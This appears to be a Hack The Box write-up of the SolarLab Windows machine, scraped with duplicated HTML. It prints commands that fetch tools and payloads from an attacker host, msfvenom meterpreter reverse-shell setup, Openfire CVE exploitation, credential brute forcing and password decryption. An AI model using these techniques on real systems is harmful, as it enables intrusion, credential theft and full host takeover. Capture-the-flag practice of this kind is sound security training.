  "articleBody": " Link: https://app.hackthebox.com/machines/SolarLab Difficulty Medium Machine Windows Enumeration Nmap\nI ran nmap 10.10.11.16 -vv -p- -T4 first to see all available ports on this box. I checked port 80 (the verbose flag showed us that port 80 was already open) while I waited for the scan to complete. I visited the site after adding 10.10.11.16 solarlab.htb to the /etc/hosts file. This is what the website looks like.\nAs the nmap finished scanning all ports, here are the open ports on this box:\nPORT STATE SERVICE REASON 80/tcp open http syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack 6791/tcp open hnm syn-ack I will perform an aggressive scan on these ports using the command: nmap 10.10.11.16 -vv -p80,135,139,445,6791 -T4 -A.\nPORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack nginx 1.24.0 |_http-title: SolarLab Instant Messenger |_http-server-header: nginx/1.24.0 | http-methods: |_ Supported Methods: GET HEAD 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack 6791/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.24.0 |_http-title: Did not follow redirect to http://report.solarlab.htb:6791/ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: I attempted to use the ‘send contact’ feature to test if we could inject XSS from here, but it initially utilized a GET request. Changing it to a POST request didn’t enable us to perform any actions.\nAs Nmap suggested that the supported methods were GET and HEAD, I used a HEAD request, which actually worked as intended.\nUser Flag Nothing seems to be working here, including XSS, SQLi, etc. For now, I will explore another port. I ran smbclient //10.10.11.16/Documents -U Guest, which actually worked and logged me in.\n┌──(root㉿kali)-[/HTB/SolarLab] └─# smbclient //10.10.11.16/Documents -U Guest Password for [WORKGROUP\\Guest]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls .

I took note of the usernames and passwords.\nNext, I visited port 6791, which had an HTTP service running on it. It redirected me to the report.solarlab.htb subdomain, which has a login page for ReportHub.\n“I tried brute-forcing the username and password fields using the credentials we found earlier with Burp Intruder. The following credentials worked: BlakeB:ThisCanB3typedeasily1@\nI did some research on ReportHub and found a CVE related to it: CVE-2023-33733.\nHere is the exploit code:\nexploit I used this request in the travel_request parameter of the /travelApprovalForm endpoint.”\nAnd I got the user flag\nPS C:\\Users\\blake\\Desktop\u003e cat user.txt USERFLAG_REDACTED_HTB Root Flag I sent winPEAS.exe to the Windows box using the following command:\nInvoke-WebRequest \"http://10.10.14.3/winPEASx86.exe\" -OutFile \"winpeasS.exe\" (make sure the HTTP server is running).\nThen I ran .\\winpeasS.exe to execute it.\nFrom the output, I discovered that there is another user named openfire (in addition to Blake, admin accounts, and service accounts) on this machine. Additionally, winPEAS revealed that Openfire is running on port 9090.\nNext, I used Chisel to set up port forwarding.\nI ran chisel server -p 8000 --reverse on my Kali machine.\nThen, on the target machine, logged in as user Blake, I executed:\n.\\chisel.exe client 10.10.14.3:8000 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091 (I transferred the Chisel executable to the target machine using Invoke-WebRequest \"http://10.10.14.3/chisel.exe\" -OutFile \"chisel.exe\" before running it).\nAfter port forwarding with Chisel, I accessed localhost:9090 and found an Openfire 4.7.4 admin console. This version has a known CVE, and an exploit is available in Metasploit.\nHere’s the exploit I used for Openfire 4.7.4\nI used exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315 to exploit the openfire.\nAlthough it didn’t create a session for us, it did create an admin user, which allowed us to log in to the application.\nI downloaded openfire-management-tool-plugin.jar from this GitHub repository.\nThen, I uploaded it in the Plugins tab. To do this, I changed the uploadsuccess=false to true in order to successfully upload our plugin. By default, the uploadsuccess parameter is set to false, which prevents the upload. I changed it to true to successfully upload the plugin.\nAfter uploading the plugin, navigate to Server \u003e Server Settings \u003e Management Tool. Set the password as ‘123’, then select ‘System Command’.\nWe found a shell execution point. I decided to execute a payload similar to the one used previously. I generated the payload from the same website I used before. Then, I launched nc and started listening on port 6565 to receive the reverse shell. Finally, I executed the PowerShell reverse shell payload from the website.\nAfter executing the command, I gained shell access for the user solarlab\\openfire.\nI discovered interesting credentials within the openfire.script file located at the PS C:\\Program Files\\Openfire\\embedded-db\\ directory.\n// NOTE: ONLY IMPORTANT DETAILS EXTRACTED FRROM THE SCRIPT IS SHOWN BELOW CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e' INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL) INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0') I received an encrypted password and a passkey. To decrypt the password, I used them together with https://github.com/c0rdis/openfire_decrypt. Following the instructions, I compiled the JAR file:\njavac OpenFireDecryptPass.java This command compiled the JAR file. To crack the hash, I executed:\njava OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn In this command, the first argument is the encrypted password, and the second one is the passkey. Through this process, I successfully cracked the hashes, revealing the credentials:\nAdministrator:ThisPasswordShouldDo!@\nNow, I am armed with these credentials.\nI installed sudo wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip on my Kali machine and then transferred the .exe file inside the zip to my target machine using Invoke-WebRequest \"http://10.10.14.3:8888/RunasCs.exe\" -OutFile \"runascs.exe\". After that, I created a payload with msfvenom: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9898 -f exe -o shell.exe and then sent the shell.exe file to the target machine using: Invoke-WebRequest \"http://10.10.14.3/shell.exe\" -OutFile \"shell.exe\".\nNow that I have both of the .exe files on my target machine, I will use the multi/handler in Metasploit to capture the shell.\nTo set up the multi/handler, I ran these commands sequentially:\nmsfconsole use multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 9898 run After that, I went to my target machine and executed the command: .\\runascs.exe Administrator ThisPasswordShouldDo!@ shell.exe\nUpon running the above code, I observed that the meterpreter shell popped up, and I gained administrator access. 🙂\nWe rooted this box! Yay!\nConclusion Thanks for following my writeup on this box. I hope you learned something new from my methodology.\n",

      SolarLab is a medium Windows machine that starts with a webpage featuring a business site. Moreover, an SMB share is accessible using a guest session that holds files with sensitive information for users on the remote machine. An attacker can extract valid credentials from this file and log in to a page allowing employees to fill out forms for company purposes. These forms are turned into PDFs using the ReportLab library, which is vulnerable to [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733). After some exploit development/modification, the attacker can get code execution as the user blake on the remote machine. Further enumeration of the remote machine reveals that Openfire is installed and running locally. By using a SOCKS tunnel, the attacker can access the Administrator Console for Openfire. It turns out that the version installed is vulnerable to [CVE-2023-32315](https://nvd.nist.gov/vuln/detail/CVE-2023-32315), which allows the attacker to bypass the authentication screen, upload a malicious plugin, and get code execution as the openfire user. The openfire user can read the logs from when the server was installed and extract all the necessary information to crack the Administrator&#39;s password, and it turns out that this password is reused for the local Administrator account.

<p><strong>Nmap</strong></p>
<p>I ran <strong><code>nmap 10.10.11.16 -vv -p- -T4</code></strong> first to see all available ports on this box. I checked port 80 (the verbose flag showed us that port 80 was already open) while I waited for the scan to complete. I visited the site after adding <strong><code>10.10.11.16 solarlab.htb</code></strong> to the <strong><code>/etc/hosts</code></strong> file. This is what the website looks like.</p>

<p>As Nmap suggested that the supported methods were GET and HEAD, I used a HEAD request, which actually worked as intended.</p>

<p>Nothing seems to be working here, including XSS, SQLi, etc. For now, I will explore another port. I ran <strong><code>smbclient //10.10.11.16/Documents -U Guest</code></strong>, which actually worked and logged me in.</p>

<p><strong><code>Invoke-WebRequest &quot;http://10.10.14.3/winPEASx86.exe&quot; -OutFile &quot;winpeasS.exe&quot;</code></strong> (make sure the HTTP server is running).</p>
<p>Then I ran <strong><code>.\winpeasS.exe</code></strong> to execute it.</p>
<p>From the output, I discovered that there is another user named <strong><code>openfire</code></strong> (in addition to Blake, admin accounts, and service accounts) on this machine. Additionally, winPEAS revealed that Openfire is running on port 9090.</p>
<p>Next, I used Chisel to set up port forwarding.</p>
<p>I ran <strong><code>chisel server -p 8000 --reverse</code></strong> on my Kali machine.</p>
<p>Then, on the target machine, logged in as user Blake, I executed:</p>

<p>Although it didn’t create a session for us, it did create an admin user, which allowed us to log in to the application.</p>
<p>I downloaded <strong><code>openfire-management-tool-plugin.jar</code></strong> from <a href="https://github.com/miko550/CVE-2023-32315">this GitHub repository</a>.</p>
<p>Then, I uploaded it in the Plugins tab. To do this, I changed the <strong><code>uploadsuccess=false</code></strong> to <strong><code>true</code></strong> in order to successfully upload our plugin. By default, the <strong><code>uploadsuccess</code></strong> parameter is set to <strong><code>false</code></strong>, which prevents the upload. I changed it to <strong><code>true</code></strong> to successfully upload the plugin.</p>

<p>We found a shell execution point. I decided to execute a payload similar to the one used previously. I generated the payload from the same website I used before. Then, I launched <strong><code>nc</code></strong> and started listening on port 6565 to receive the reverse shell. Finally, I executed the PowerShell reverse shell payload from the website.</p>

<p><strong><code>Administrator:ThisPasswordShouldDo!@</code></strong></p>
<p>Now, I am armed with these credentials.</p>
<p>I installed sudo <strong><code>wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip</code></strong> on my Kali machine and then transferred the .exe file inside the zip to my target machine using <strong><code>Invoke-WebRequest &quot;http://10.10.14.3:8888/RunasCs.exe&quot; -OutFile &quot;runascs.exe&quot;</code></strong>. After that, I created a payload with msfvenom: <strong><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9898 -f exe -o shell.exe</code></strong> and then sent the shell.exe file to the target machine using: <strong><code>Invoke-WebRequest &quot;http://10.10.14.3/shell.exe&quot; -OutFile &quot;shell.exe&quot;</code></strong>.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/solarlab/SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2013.png"></p>
<p>Now that I have both of the .exe files on my target machine, I will use the multi/handler in Metasploit to capture the shell.</p>
<p>To set up the multi/handler, I ran these commands sequentially:</p>
<ul>
<li><strong><code>msfconsole</code></strong></li>
<li><strong><code>use multi/handler</code></strong></li>
<li><strong><code>set payload windows/x64/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>set lhost tun0</code></strong></li>
<li><strong><code>set lport 9898</code></strong></li>
<li><strong><code>run</code></strong></li>
</ul>
<p>After that, I went to my target machine and executed the command:
<strong><code>.\runascs.exe Administrator ThisPasswordShouldDo!@ shell.exe</code></strong></p>
<p>Upon running the above code, I observed that the meterpreter shell popped up, and I gained administrator access. 🙂</p>
<p>We rooted this box! Yay!</p>
